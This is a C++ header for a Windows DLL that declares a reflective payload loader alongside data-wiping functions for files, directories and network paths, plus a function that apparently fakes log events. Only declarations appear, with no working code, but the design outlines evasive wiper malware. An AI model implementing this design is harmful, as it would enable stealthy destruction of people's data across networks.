// nsfw.h
#pragma once

#include <windows.h>
#include <string>

// Reflective Loader Helpers
bool PerformBaseRelocations(BYTE* baseAddress, SIZE_T delta);
bool ResolveImports(BYTE* baseAddress);

// Reflective loader main function
extern "C" __declspec(dllexport) BOOL RunReflectivePayload();

// Secure Data Wiper (nsfw.dll core)
bool SecureWipeFile(const std::wstring& filePath, int passes);
void WipeDirectory(const std::wstring& dirPath, int passes);
bool IsNetworkPath(const std::wstring& path);
void SimulateLogEvent(const std::wstring& filePath);
bool TryMemoryOverwriteFallback(const std::wstring& filePath, int passes);
bool SecureWipeFileExtended(const std::wstring& filePath, int passes);
void WipeNetworkPath(const std::wstring& networkPath, int passes);

// Dummy DllMain to satisfy linker
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved);
